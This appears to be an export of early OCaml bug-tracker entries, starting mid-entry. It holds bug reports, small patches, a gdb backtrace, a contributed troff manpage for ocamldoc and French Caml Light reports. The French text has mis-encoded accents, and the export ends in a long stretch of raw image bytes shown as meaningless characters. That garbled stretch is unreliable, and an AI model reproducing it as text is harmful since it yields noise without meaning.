description\n\nFull_Name: Berke Durak\nVersion: 3.07\nOS: Debian/unstable under Linux 2.6.1\nSubmission from: congruence.net1.nerim.net (213.41.151.68)\n\n\nIn function gr_set_window_title, file otherlibs/graph/open.c, line 241 :\nwindow_name=stat_alloc(strlen(String_val(n))) should be replaced by\nwindow_name=stat_alloc(strlen(String_val(n))+1).\n"},{"labels":["bug"],"text":"**Original bug ID:** 2149\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nHello,\n\nI've made a manpage for ocamldoc which is mainly a cut and paste from\nthe html documentation (I have attached it to this mail, it may be not\nperfect but it looks like a manpage). It was originally for the Debian\npackage but, since anyway you would have to authorize us because of the\ndocumentation's license, I think the best would be to include it\ndirectly in the OCaml distribution. Would this be possible ?\n\nThanks,\n\nSamuel.\n\n\n-- \nSamuel Mimram\n\nsamuel.mimram@ens-lyon.fr\n\n----------------\n.de Sh \\\" Subsection heading\n.br\n.if t .Sp\n.ne 5\n.PP\n\\fB\\\\$1\\fR\n.PP\n..\n\n.TH OCAMLDOC 1\n\n.SH NAME\nocamldoc \\- The Objective Caml documentation generator\n\n\n.SH SYNOPSIS\n.B ocamldoc\n[\n.B \\-html\n]\n[\n.B \\-latex\n]\n[\n.B \\-texi\n]\n[\n.B \\-man\n]\n[\n.B \\-dot\n]\n[\n.BI \\-g \\ file\n]\n[\n.BI \\-d \\ dir\n]\n[\n.BI \\-dump \\ file\n]\n[\n.BI \\-hide \\ module\n]\n[\n.B \\-inv-merge-ml-mli\n]\n[\n.B \\-keep-code\n]\n[\n.BI \\-load \\ file\n]\n[\n.BI \\-m \\ flags\n]\n[\n.BI \\-o \\ file\n]\n[\n.BI \\-I \\ directory\n]\n[\n.BI ...\n]\n.I filename ...\n\n.SH DESCRIPTION\n\nThe Objective Caml documentation generator\n.BR ocamldoc (1)\ngenerates documentation from special comments embedded in source files. The\ncomments used by OCamldoc are of the form\n.I (**...*)\nand follow the format described in the\n.IR \"The Objective Caml user's manual\" .\n\nOCamldoc can produce documentation in various formats: HTML, LaTeX, TeXinfo,\nUnix man pages, and dot dependency graphs. Moreover, users can add their own\ncustom generators.\n\nIn this manpage, we use the word\n.IR element\nto refer to any of the following parts of an OCaml source file: a type\ndeclaration, a value, a module, an exception, a module type, a type\nconstructor, a record field, a class, a class type, a class method, a class\nvalue or a class inheritance clause.\n\n.SH OPTIONS\n\nThe following command-line options determine the format for the generated\ndocumentation generated by\n.BR ocamldoc (1).\n\n.Sh \"Options for choosing the output format\"\n\n.TP\n.B \\-html\nGenerate documentation in HTML default format. The generated HTML pages are\nstored in the current directory, or in the directory specified with the\n.B \\-d\noption. You can customize the style of the generated pages by editing the\ngenerated\n.I style.css\nfile, or by providing your own style sheet using option\n.B \\-css-style\n. The file\n.I style.css\nis not generated if it already exists.\n\n.TP\n.B \\-latex\nGenerate documentation in LaTeX default format. The generated LaTeX document\nis saved in file\n.IR ocamldoc.out ,\nor in the file specified with the\n.B -o\noption. The document uses the style file\n.IR ocamldoc.sty .\nThis file is generated when using the\n.B \\-latex\noption, if it does not already exist. You can change this file to customize\nthe style of your LaTeX documentation.\n\n.TP\n.B \\-texi\nGenerate documentation in TeXinfo default format. The generated LaTeX document\nis saved in file\n.IR ocamldoc.out ,\nor in the file specified with the\n.B -o\noption.\n\n.TP\n.B \\-man\nGenerate documentation as a set of Unix man pages. The generated pages are\nstored in the current directory, or in the directory specified with the\n.B \\-d\noption.\n\n.TP\n.B \\-dot\nGenerate a dependency graph for the toplevel modules, in a format suitable for\ndisplaying and processing by dot. The dot tool is available from\n.IR http://www.research.att.com/sw/tools/graphviz/ .\nThe textual representation of the graph is written to the file\n.IR ocamldoc.out ,\nor to the file specified with the\n.B -o\noption. Use\n.BI dot \\ ocamldoc.out\nto display it.\n\n.TP\n.BI \\-g \\ file\nDynamically load the given file (which extension usually is .cmo or .cma),\nwhich defines a custom documentation generator. This option is supported by the\n.BR ocamldoc (1)\ncommand, but not by its native-code version\n.BR ocamldoc.opt .\n\n.Sh \"General options\"\n\n.TP\n.BI \\-d \\ dir\nGenerate files in directory\n.IR dir ,\nrather than in the current directory.\n\n.TP\n.BI \\-dump \\ file\nDump collected information into file. This information can be read with the\n.B -load\noption in a subsequent invocation of\n.BR ocamldoc (1).\n\n.TP\n.B \\-hide modules\nHide the given complete module names in the generated documentation modules is\na list of complete module names are separated by ',', without blanks. For\ninstance:\n.IR Pervasives,M2.M3 .\n\n.TP\n.B \\-inv-merge-ml-mli\nInverse implementations and interfaces when merging. All elements in\nimplementation files are kept, and the\n.B \\-m\noption indicates which parts of the comments in interface files are merged with\nthe comments in implementation files.\n\n.TP\n.B \\-keep-code\nAlways keep the source code for values, methods and instance variables, when\navailable. The source code is always kept when a .ml\nfile is given, but is by default discarded when a .mli\nis given. This option allows to always keep the source code.\n\n.TP\n.BI \\-load \\ file\nLoad information from\n.IR file ,\nwhich has been produced by\n.B ocamldoc\n.BR \\-dump .\nSeveral\n.B -load\noptions can be given.\n\n.TP\n.BI \\-m flags\nSpecify merge options between interfaces and implementations.\n.I flags\ncan be one or several of the following characters:\n\n.B d\nmerge description\n\n.B a\nmerge @author\n\n.B v\nmerge @version \n\n.B l\nmerge @see\n\n.B s\nmerge @since\n\n.B o\nmerge @deprecated \n\n.B p\nmerge @param \n\n.B e\nmerge @raise \n\n.B r\nmerge @return \n\n.B A\nmerge everything \n\n.TP\n.B \\-no-custom-tags\nDo not allow custom @-tags.\n\n.TP\n.B \\-no-stop\nKeep elements placed after the\n.I (**/**)\nspecial comment.\n\n.TP\n.BI \\-o \\ file\nOutput the generated documentation to\n.I file\ninstead of\n.IR ocamldoc.out .\nThis option is meaningful only in conjunction with the\n.BR -latex ,\n.BR -texi ,\nor\n.B -dot\noptions.\n\n.TP\n.BI \\-pp \\ command\nPipe sources through preprocessor command.\n\n.TP\n.B \\-sort\nSort the list of top-level modules before generating the documentation.\n\n.TP\n.B \\-stars\nRemove blank characters until the first asterisk ('*') in each line of comments.\n\n.TP\n.BI \\-t \\ title\nUse\n.I title\nas the title for the generated documentation.\n\n.TP\n.B \\-v\nVerbose mode. Display progress information.\n\n.TP\n.B \\-warn-error\nTreat warnings as errors.\n\n.Sh \"Type-checking options\"\n\n.BR ocamldoc (1)\ncalls the Objective Caml type-checker to obtain type informations. The\nfollowing options impact the type-checking phase. They have the same meaning\nas for the\n.BR ocamlc (1)\nand\n.BR ocamlopt (1)\ncommands.\n\n.TP\n.BI \\-I \\ directory\nAdd directory to the list of directories search for compiled interface files\n(.cmi files).\n\n.TP\n.B \\-nolabels\nIgnore non-optional labels in types.\n\n.TP\n.B \\-rectypes\n Allow arbitrary recursive types. (See the\n.B \\-rectypes\noption to\n.BR ocamlc (1).)\n\n.Sh \"Options for generating HTML pages\"\n\nThe following options apply in conjunction with the\n.B \\-html\noption:\n\n.TP\n.B \\-all-params\nDisplay the complete list of parameters for functions and methods.\n\n.TP\n.BI \\-css-style \\ filename\nUse filename as the Cascading Style Sheet file.\n\n.TP\n.B \\-colorize-code\nColorize the OCaml code enclosed in [ ] and \\\\{[ ]\\\\}, using colors to emphasize\nkeywords, etc. If the code fragments are not syntactically correct, no color\nis added.\n\n.TP\n.B \\-index-only\nGenerate only index files.\n\n.Sh \"Options for generating LaTeX files\"\n\nThe following options apply in conjunction with the\n.B \\-latex\noption:\n\n.TP\n.B \\-latex-value-prefix prefix\nGive a prefix to use for the labels of the values in the generated LaTeX\ndocument. The default prefix is the empty string. You can also use the options\n.BR -latex-type-prefix ,\n.BR -latex-exception-prefix ,\n.BR -latex-module-prefix ,\n.BR -latex-module-type-prefix ,\n.BR -latex-class-prefix ,\n.BR -latex-class-type-prefix ,\n.B -latex-attribute-prefix\nand\n.BR -latex-method-prefix .\n\nThese options are useful when you have, for example, a type and a value\nwith the same name. If you do not specify prefixes, LaTeX will complain about\nmultiply defined labels.\n\n.TP\n.BI \\-latextitle \\ n,style\nAssociate style number\n.I n\nto the given LaTeX sectioning command style, e.g. section or subsection.\n(LaTeX only.) This is useful when including the generated document in another\nLaTeX document, at a given sectioning level. The default association is 1 for\nsection, 2 for subsection, 3 for subsubsection, 4 for paragraph and 5 for\nsubparagraph.\n\n.TP\n.B \\-noheader\nSuppress header in generated documentation.\n\n.TP\n.B \\-notoc\nDo not generate a table of contents.\n\n.TP\n.B \\-notrailer\nSuppress trailer in generated documentation.\n\n.TP\n.B \\-sepfiles\nGenerate one .tex file per toplevel module, instead of the global\n.I ocamldoc.out\nfile. \n\n.Sh \"Options for generating TeXinfo files\"\n\nThe following options apply in conjunction with the\n.B -texi\noption:\n\n.TP\n.B \\-esc8\nEscape accented characters in Info files.\n\n.TP\n.B\n\\-info-entry\nSpecify Info directory entry.\n\n.TP\n.B \\-info-section\nSpecify section of Info directory.\n\n.TP\n.B \\-noheader\nSuppress header in generated documentation.\n\n.TP\n.B \\-noindex\nDo not build index for Info files.\n\n.TP\n.B \\-notrailer\nSuppress trailer in generated documentation. \n\n.Sh \"Options for generating dot graphs\"\n\nThe following options apply in conjunction with the\n.B \\-dot\noption:\n\n.TP\n.BI \\-dot-colors \\ colors\nSpecify the colors to use in the generated dot code. When generating module\ndependencies,\n.BR ocamldoc (1)\nuses different colors for modules, depending on the directories in which they\nreside. When generating types dependencies,\n.BR ocamldoc (1)\nuses different colors for types, depending on the modules in which they are\ndefined. colors is a list of color names separated by ',', as in\n.IR Red,Blue,Green .\nThe available colors are the ones supported by the\n.BR dot (1)\ntool.\n\n.TP\n.B \\-dot-include-all\nInclude all modules in the\n.BR dot (1)\noutput, not only modules given on the command line or loaded with the\n.B \\-load\noption.\n\n.TP\n.B \\-dot-reduce\nPerform a transitive reduction of the dependency graph before outputting the\ndot code. This can be useful if there are a lot of transitive dependencies\nthat clutter the graph.\n\n.TP\n.B \\-dot-types\nOutput dot code describing the type dependency graph instead of the module\ndependency graph.\n\n.Sh \"Options for generating man files\"\n\nThe following options apply in conjunction with the\n.B \\-man\noption:\n\n.TP\n.B \\-man-mini\nGenerate man pages only for modules, module types, clases and class types,\ninstead of pages for all elements.\n\n.TP\n.B \\-man-suffix\nSet the suffix used for generated man filenames. Default is 'o', like in\n.IR List.o .\n\n\n.SH SEE ALSO\n.BR ocaml (1),\n.BR ocamlc (1),\n.BR ocamlopt (1).\n.br\n.IR \"The Objective Caml user's manual\",\nchapter \"The documentation generator\".\n----------------\n----------------\n----------------\n-----BEGIN PGP SIGNATURE-----\nVersion: GnuPG v1.2.4 (GNU/Linux)\n\niD8DBQFAIMbOIae1O4AJae8RAkSoAJ0ZZ1JkHqW6c2OqMiZTJpUN1SmNpwCfdm7x\ncnUehYQ7EHXT8JQf2kPx5WQ=\n=nV7v\n-----END PGP SIGNATURE-----\n\n----------------\n----------------\n"},{"labels":["bug"],"text":"**Original bug ID:** 2124\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Lars Nilsson\nVersion: CVS HEAD\nOS: RedHat Linux 9.0\nSubmission from: host-64-179-106-232.ind.choiceone.net (64.179.106.232)\n\n\nmake world fails with the following\n\nboot/ocamlrun boot/ocamlc -nostdlib -I boot  -linkall -o ocaml.tmp\ntoplevel/toplevellib.cma toplevel/topstart.cmo\nError while linking boot/stdlib.cma(Gc):\nThe external function `caml_gc_quick_stat' is not available\nmake: *** [ocaml] Error 2\n"},{"labels":["bug"],"text":"**Original bug ID:** 2122\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Tilman Linneweh\nVersion: 3.07\nOS: FreeBSD sparc64\nSubmission from: 21322530218.direct.eti.at (213.225.30.218)\n\n\nWhile compiling ocaml, ocamlc.opt crashes with Signal 11.\n\n../../ocamlcomp.sh -c -warn-error A unix.mli\n*** Signal 11\n\nStop in /s/scratch/arved/ocaml/work/ocaml-3.07/otherlibs/unix.\n*** Error code 1\n\ngdb ocamlc.opt -c otherlibs/unix/ocamlc.opt.core\nGNU gdb 5.3 (FreeBSD)\nCopyright 2002 Free Software Foundation, Inc.\nGDB is free software, covered by the GNU General Public License, and you are\nwelcome to change it and/or distribute copies of it under certain conditions.\nType \"show copying\" to see the conditions.\nThere is absolutely no warranty for GDB.  Type \"show warranty\" for details.\nThis GDB was configured as \"sparc64-portbld-freebsd5.0\"...\n(no debugging symbols found)...\nCore was generated by `ocamlc.opt'.\nProgram terminated with signal 11, Segmentation fault.\nReading symbols from /lib/libm.so.2...(no debugging symbols found)...done.\nLoaded symbols for /lib/libm.so.2\nReading symbols from /lib/libncurses.so.5...(no debugging symbols found)...\ndone.\nLoaded symbols for /lib/libncurses.so.5\nReading symbols from /usr/lib/libc_r.so.5...(no debugging symbols found)...\ndone.\nLoaded symbols for /usr/lib/libc_r.so.5\nReading symbols from /lib/libc.so.5...(no debugging symbols found)...done.\nLoaded symbols for /lib/libc.so.5\nReading symbols from /libexec/ld-elf.so.1...(no debugging symbols found)...\ndone.\nLoaded symbols for /libexec/ld-elf.so.1\n#0  0x00000000002141d4 in Pervasives__entry ()\n(gdb) bt\n#0  0x00000000002141d4 in Pervasives__entry ()\n#1  0x00000000002141cc in Pervasives__entry ()\n#2  0x0000000000245384 in caml_main ()\n#3  0x000000000023474c in main ()\n#4  0x00000000001411a8 in _start ()\n(gdb)\n"},{"labels":["bug"],"text":"**Original bug ID:** 2121\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Ville-Pertti Keinonen\nVersion: CVS\nOS: \nSubmission from: fa-3-0-0.fw.exomi.com (217.169.64.99)\n\n\nFor architectures that define ARCH_ALIGN_DOUBLE, the Store_double_val macro is\nmissing the second argument:\n\nRCS file: /caml/ocaml/byterun/mlvalues.h,v\nretrieving revision 1.47\ndiff -u -r1.47 mlvalues.h\n--- mlvalues.h  2004/01/02 19:23:25     1.47\n+++ mlvalues.h  2004/02/02 13:12:59\n@@ -228,7 +228,7 @@\n CAMLextern double caml_Double_val (value);\n CAMLextern void caml_Store_double_val (value,double);\n #define Double_val(v) caml_Double_val(v)\n-#define Store_double_val(v) caml_Store_double_val(v)\n+#define Store_double_val(v,d) caml_Store_double_val(v,d)\n #endif\n \n /* Arrays of floating-point numbers. */\n"},{"labels":["bug"],"text":"**Original bug ID:** 2117\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nDear caml-list administrator(s),\n\nI just subscribed to caml-list, and I was looking at the archives.\nI must say, I'm more than a little scared to post to the list.\n\n1) If I post to the list, will my email address appear in the web\narchives, unprotected, for any spammer to harvest?\n\n2) Why are there so many spam messages in the archive?\n\nNumber 1) is of more concern to me. Please let me know what measures you\nhave taken/are taking to protect the email addresses of your list members.\n\nIf you are taking no measures to protect the email addresses of your list\nmembers, then I have no interest in participating in caml-list discussion,\nand you can feel free to unsubscribe me from the list. But I dearly hope\nthat it will not come to this.\n\n\tJoseph\n"},{"labels":["bug"],"text":"**Original bug ID:** 2107\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: AndrÃ© Allavena\nVersion: Objective Caml native-code compiler, version 3.02\nOS: SunOS 5.8 Generic_108528-14 sun4u sparc SUNW,Sun-Fire-280R\nSubmission from: dhcp97-237.cs.cornell.edu (128.84.97.237)\n\n\nopen_out_gen has issues ompiling with ocamlopt:\n\nopen_out_gen [Open_wronly; Open_creat; Open_append ] 0o644 fichier\nworks fine,\nbut\nopen_out_gen [Open_creat; Open_append ] 0o644 fichier\ndoesn't.\n[The difference is in the Open_wronly flag]\n\nBoth compile fine. I get a \nFatal error: uncaught exception Sys_error(\"Bad file number\")\nat run time in the second case,when the Open_wronly is absent.\nMore precisely, the error arises when I actually try to write to the file \n      Printf.fprintf stat_file \"%f\\t%f\\t%f\\n\" single_tmp double_tmp\ntriple_tmp;;\nwhen I had earlier on\nlet stat_file = open_out_gen [Open_wronly; Open_creat; Open_append ] 0o644\nfichier\n\n\nBoth versions work under Linux 3-07\n"},{"labels":["bug"],"text":"**Original bug ID:** 2104\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Pierre Mouy\nVersion: caml light 0.74 for Windows\nOS: ???\nSubmission from: m209.net81-66-80.noos.fr (81.66.80.209)\n\n\nBonjour,\nces lignes creent une erreur fatale : \n\n\nlet oo = open_out \"test1.out\";;\noutput_value oo [1;2];;\nclose_out oo;;\n\nlet oo = open_in \"test1.out\";;\ninput_value oo [1;2];;\nclose_in oo;;\n\n\nPourquoi? J'aimerais recevoir une reponse par mail.\nMerci,\nPierre\n"},{"labels":["bug"],"text":"**Original bug ID:** 2061\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** ~DO NOT USE (was: OCaml general)\n\n## Bug description\n\nFull_Name: Jacek Chrz&#261;szcz\nVersion: CVS (3.07+13)\nOS: FC1\nSubmission from: fw-gw-atm.mimuw.edu.pl (193.0.96.15)\n\n\nHello,\n\nWhile compiling ocaml in a shell with my polish-UTF-8 locale, the sed command\nfrom ocamldoc/remove_DEBUG script does not handle french accents correctly,\nprovoking Syntax errors.\n\nI propose the following patch to solve the problem\n\nJacek\n\n\n----------------- cut here -----------------------\nIndex: remove_DEBUG\n===================================================================\nRCS file: /caml/ocaml/ocamldoc/remove_DEBUG,v\nretrieving revision 1.1\ndiff -a -u -r1.1 remove_DEBUG\n--- remove_DEBUG        2003/07/27 09:13:43     1.1\n+++ remove_DEBUG        2004/01/26 13:42:57\n@@ -5,4 +5,4 @@\n # respecting the cpp # line annotation conventions\n  \n echo \"# 1 \\\"$1\\\"\"\n-sed -e '/DEBUG/s/.*//' \"$1\"\n+LC_ALL=C sed -e '/DEBUG/s/.*//' \"$1\"\n"},{"labels":["bug",null],"text":"**Original bug ID:** 2058\n**Reporter:** administrator\n**Status:** closed\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Category:** -for Caml light use https://github.com/camllight/camllight/issues\n\n## Bug description\n\nMalgrÃ© le fait d'avoir choisi tous les systÃ¨mes d'exploitation possibles dans les tests de compatibilitÃ© de Windows XP, le systÃ¨me renvoie Ã  chaque Ã©xÃ©cution du fichier cl74win.exe un message une fenÃªtre d'erreur intitulÃ©e \"Sous-systÃ¨me Windows 16 bits\". Voici un aperÃ§u de cette fenÃªtre :         \n\nSi on clique sur Fermer, le programme s'arrÃ¨te et plus rien ne se passe. Si on clique sur Ignorer, la mÃªme fenÃªtre est rÃ©ouverte avec l'adresse commenÃ§ant par CS: changÃ©e. En plus de celle affichÃ©e sur l'images ci jointe, les adresses suivantes sont affichÃ©es en cliquant plusieurs fois sur Ignorer jusqu'Ã  ce que, au bout de quelques clics, la fenÃªtre se ferme et que le systÃ¨me revient Ã  son Ã©tat normal :\nCS:0213 IP:011e OP:0f ff 28 18\nCS:00a7 IP:100f OP:63 3a 5c 77 69\nCS:018b IP:05fd OP:ff e9 05 00 01\nCS:018b IP:0017 OP:ff ff ff ff 13\nCS:018b IP:0017 OP:ff ff ff 13 0b\nCS:018b IP:0019 OP:ff ff 13 0b 07\n\nJ'espÃ¨re que vous pourrez trouver une solution Ã  mon problÃ¨me car la version Objective Caml n'est pas trÃ¨s Ã©vidente et de plus elle m'affiche un message d'erreur Ã  chaque que j'utilise le symbole | pour le filtrage de donnÃ©es. Merci d'avance, Nicolas Kremmer.\n----------------\n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD>\n<META http-equiv=Content-Type content=\"text/html; charset=iso-8859-1\">\n<META content=\"MSHTML 6.00.2800.1276\" name=GENERATOR>\n<STYLE></STYLE>\n</HEAD>\n<BODY bgColor=#ffffff>\n<DIV><FONT face=Arial size=2>MalgrÃ© le fait d'avoir choisi tous les systÃ¨mes \nd'exploitation possibles dans les tests de compatibilitÃ© de Windows XP, le \nsystÃ¨me renvoie Ã  chaque Ã©xÃ©cution du fichier cl74win.exe un message une fenÃªtre \nd'erreur intitulÃ©e \"Sous-systÃ¨me Windows 16 bits\". Voici un aperÃ§u de cette \nfenÃªtre : &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; <IMG \nstyle=\"WIDTH: 438px; HEIGHT: 118px\" alt=\"\" hspace=100 \nsrc=\"cid:000501c3e379$2095ebf0$0200a8c0@bobby\" align=absMiddle \nborder=0></FONT></DIV>\n<DIV><FONT face=Arial size=2></FONT>&nbsp;</DIV>\n<DIV><FONT face=Arial size=2>Si on clique sur Fermer, le programme s'arrÃ¨te et \nplus rien ne se passe. Si on clique sur Ignorer, la mÃªme fenÃªtre est rÃ©ouverte \navec l'adresse commenÃ§ant par CS: changÃ©e. En plus de celle affichÃ©e sur \nl'images ci jointe, les adresses suivantes sont affichÃ©es en cliquant plusieurs \nfois sur Ignorer jusqu'Ã  ce que, au bout de quelques clics, la fenÃªtre se ferme \net que le systÃ¨me revient Ã  son Ã©tat normal :</FONT></DIV>\n<DIV><FONT face=Arial size=2>CS:0213 IP:011e OP:0f ff 28 18</FONT></DIV>\n<DIV><FONT face=Arial size=2>\n<DIV><FONT face=Arial size=2>CS:00a7 IP:100f OP:63 3a 5c 77 69</FONT></DIV>\n<DIV>\n<DIV><FONT face=Arial size=2>CS:018b IP:05fd OP:ff e9 05 00 01</FONT></DIV>\n<DIV>CS:018b IP:0017 OP:ff ff ff ff 13</DIV>\n<DIV>CS:018b IP:0017 OP:ff ff ff 13 0b</DIV>\n<DIV>CS:018b IP:0019 OP:ff ff 13 0b 07</DIV>\n<DIV>&nbsp;</DIV>\n<DIV>J'espÃ¨re que vous pourrez trouver une solution Ã  mon problÃ¨me car la \nversion Objective Caml n'est pas trÃ¨s Ã©vidente et de plus elle m'affiche un \nmessage d'erreur Ã  chaque que j'utilise le symbole | pour le filtrage de \ndonnÃ©es. Merci d'avance, Nicolas Kremmer.</DIV></DIV></FONT></DIV></BODY></HTML>\n\n----------------\n----------------\n----------------\nÃ¿ÃÃ¿Ã \u0000\u0010JFIF\u0000\u0001\u0002\u0001\u0000H\u0000H\u0000\u0000Ã¿Ã\u0000\u0011\b\u0000v\u0001Â¶\u0003\u0001\"\u0000\u0002\u0011\u0001\u0003\u0011\u0001Ã¿Ã\u0000â\u0000\u0005\u0003\u0003\u0004\u0003\u0003\u0005\u0004\u0004\u0004\u0005\u0005\u0005\u0006\u0007\r\b\u0007\u0007\u0007\u0007\u0010\u000b\f\t\r\u0013\u0010\u0014\u0013\u0012\u0010\u0012\u0012\u0015\u0017\u001e\u0019\u0015\u0016\u001c\u0016\u0012\u0012\u001a#\u001a\u001c\u001f !\"!\u0014\u0019%'$ '\u001e!! \u0001\u0005\u0005\u0005\u0007\u0006\u0007\u000f\b\b\u000f \u0015\u0012\u0015\u0015                                                 Ã¿Ã\u0001Â¢\u0000\u0000\u0001\u0005\u0001\u0001\u0001\u0001\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\b\t\n\u000b\u0010\u0000\u0002\u0001\u0003\u0003\u0002\u0004\u0003\u0005\u0005\u0004\u0004\u0000\u0000\u0001}\u0001\u0002\u0003\u0000\u0004\u0011\u0005\u0012!1A\u0006\u0013Qa\u0007\"q\u00142?âÂ¡\b#BÂ±Ã\u0015RÃÃ°$3brâ\t\n\u0016\u0017\u0018\u0019\u001a%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÆââ¦â â¡Ëâ°Å ââââ¢ââËâ¢Å¡Â¢Â£Â¤Â¥Â¦Â§Â¨Â©ÂªÂ²Â³Â´ÂµÂ¶Â·Â¸Â¹ÂºÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ¡Ã¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ±Ã²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹Ãº\u0001\u0000\u0003\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0000\u0001\u0002\u0003\u0004\u0005\u0006\u0007\b\t\n\u000b\u0011\u0000\u0002\u0001\u0002\u0004\u0004\u0003\u0004\u0007\u0005\u0004\u0004\u0000\u0001\u0002w\u0000\u0001\u0002\u0003\u0011\u0004\u0005!1\u0006\u0012AQ\u0007aq\u0013\"2?\b\u0014BâÂ¡Â±Ã\t#3RÃ°\u0015brÃ\n\u0016$4Ã¡%Ã±\u0017\u0018\u0019\u001a&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzâÆââ¦â â¡Ëâ°Å ââââ¢ââËâ¢Å¡Â¢Â£Â¤Â¥Â¦Â§Â¨Â©ÂªÂ²Â³Â´ÂµÂ¶Â·Â¸Â¹ÂºÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃÃ¢Ã£Ã¤Ã¥Ã¦Ã§Ã¨Ã©ÃªÃ²Ã³Ã´ÃµÃ¶Ã·Ã¸Ã¹ÃºÃ¿Ã\u0000\f\u0003\u0001\u0000\u0002\u0011\u0003\u0011\u0000?\u0000Ã´Ã¯Å½Â¿\u001d|GÃ°ÃÃÃ¶Âº>?eÂ¤Mo.Å¸\u001dÃ7VÃ¬Ã¬\u0018Â³Â©\u0019\f8Ã¹GÃ«\\\bÃ½Â®Â¼q?Ã¹\u0006xsÃ¿\u0000\u0001$Ã¿\u0000Ã£â¢Ã|^Ã°Ã¶â¡Ã¢Å½vÂ¶\u001aÃÃ+\u001f\fâ ÃÃ¡Â¸ËÃ\u0015ÃÃÃ¹\u0004Q;â\bRIÃ¨A8\u0000\u001ekÃ5?â Â·ÃºÅ½Â½Â«)ÃÃ Ã°uÂ¶â\fMÂ¨â¹Ã»â¢$â ÃÅâ¦]Â¬\u0015ÅÂ«Â·Ã\u001f?ËÅ Ã½\u000fâ¡0Y]\\\r?Â¬SNN-Â¶ÃºÃ»Ã²KÂ­ÃÃ-\u0017UÃ\u001f'Å¡ÃÃC\u0011/e;FÃ©[Ã¾ÃOÂµâÃÃ·Ã¬u\u001fÃ°Ã>8Ã¿\u0000Â gâ¡?Ã°\u0012OÃ¾9KÃ¿\u0000\roÃ£Ãº\u0006xwÃ¿\u0000\u0001$Ã¿\u0000Ã£â¢Ã_Ã¼(ÃÃ´âºO\u0014O|-mÃÃ/\u0002^ÃÃw?ÅÃPÃ?â:\u001eHÃ ?Â¥jkÅ¸\u0002ÃµÃ¯\r?TÃªzÂ¦â°o\u0016âºpÂ¶Â­+Ã8IÂ¦h\u0004Ã¢4%8;\bÃ¥Ã¶âx\u0004ÅWÂ¶Ã²Ã¬?+Ã²FÃ?Ã®Ã¿\u0000Ã²QÃ»ÃÃ§}k3Â½Â¹Å¸ÃµÃ²qÃ\u000fÃÃÃÃ¿\u0000Ã´\fÃ°Ã¯Ã¾\u0002?Ã¿\u0000\u001cÂ¥Ã¿\u0000â ÂµÃ±Â¿Ã½\u0003<;Ã¿\u0000â¬?Ã¿\u0000Ã+ÃÂ¼!Ã¡]CÃÂ¾#Â³ÃtÂ¡\u0011Â»Â»bÂ±Ã¹Â¯ÂµF\u0014Â±$Ãº\u0000\tÂ­5Ã¸wwpu?aÂªÃ©7Ã¿\u0000ÃV+}'ÃÃ¥reâ¹#q@P\u0010SpÃÂ­Â´?JÃÂ¦IâS|Â²Â¥\u0014ÃÂ¿]Â»Ã¹Ã}â¢Å3\f|ÃÃ£7Â½Å½Ã¯Ã¾\u001aÃÃÃÃ´\rÃ°Ã¯Ã¾\u0002?Ã¿\u0000\u001cÂ¥\u001fÂµÅ¸?Â¿Ã¨\u001bÃ¡Ã¯Ã¼\u0004Ã¾9\\ÃÂ§Ã°?]ÃÃ´ÃÂ¯Ãµ-SDÂ³Å½\u0010ËÃ-ÃÂ©\u00134>pâ¬Ã¼Ë\u000fÂ³\u001dH\\?\u0003\u0012qVÂ£Ã¸B.Ã¼=Ã {Ã­\u0016Ã¶\u001dOTÃ±\u0014Ãâ Â³}Ã©\u001e#aÅ\u001dÂª@@\u00189Ã\u000eHÃÂ¸\rÃÃÃ²Ã¼â¦;(G{uÃ¬Ã¥Ã·Y^Ã»[SUâ°ÃÃ­Ã±=Â¯Ã¸Â¥Ã¹Â»\u001bÆÃ¶Â±Ã±Â¯Ã½\u0003|=Ã¿\u0000â¬?Ã¿\u0000Ã)GÃ­aÃ£\\Ã7ÃÃÃ¸\bÃ¿\u0000Ã¼rÂ°Ã¯Ã¾\u000fÃjÃºÂ¤Ã·Å¡,Å¡EÂ¾â¹-ÅÃâ\u0013Â­Ã¤Â²@Â°Ã\"Ã0Wd\u000ev3g\fÂ¹Ã8,zÃÂ¼Ã¸5Â­ÃÃÃÃ\u001dÃ¾â¢rÃicXHÂ¡âMÃÃÅ~Ã¹7 \u0018\u0019Ã»Â¬UÂ¸?-(Ã¥Ã¹\u0013Å 